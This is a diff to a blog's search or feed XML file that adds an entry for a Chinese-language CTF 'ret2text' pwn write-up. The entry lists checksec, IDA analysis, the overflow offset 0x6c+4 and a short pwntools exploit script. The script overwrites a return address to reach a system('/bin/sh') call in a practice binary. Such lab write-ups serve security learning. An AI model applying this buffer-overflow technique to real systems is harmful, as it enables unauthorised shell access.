@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ret2text</title>
+      <link href="/2022/01/10/ret2text/"/>
+      <url>/2022/01/10/ret2text/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>首先checksec</p><img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li><li><p>拖入IDA</p><ul><li><p>发现危险函数</p><img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li></ul></li><li><ul><li><p>发现system和bin/sh</p><img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li></ul></li><li><p>找到s相对于ebp的距离0x6c+4</p><img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li><li><p>编写exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                             2 log_level = 'debug'  3 local = 1  4 if local:  5     r = process("./ret2text")  6 else:  7     r = remote("")  8 elf = ELF("./ret2text")  9   10 s = 0x6c + 4 11 system_addr = 0x0804863A 12   13 payload = b'a'*s+p32(system_addr) 14 r.sendline(payload) 15   16 r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Defcon-2015-r0pbaby</title>
       <link href="/2022/01/10/defcon-2015-r0pbaby/"/>
       <url>/2022/01/10/defcon-2015-r0pbaby/</url>
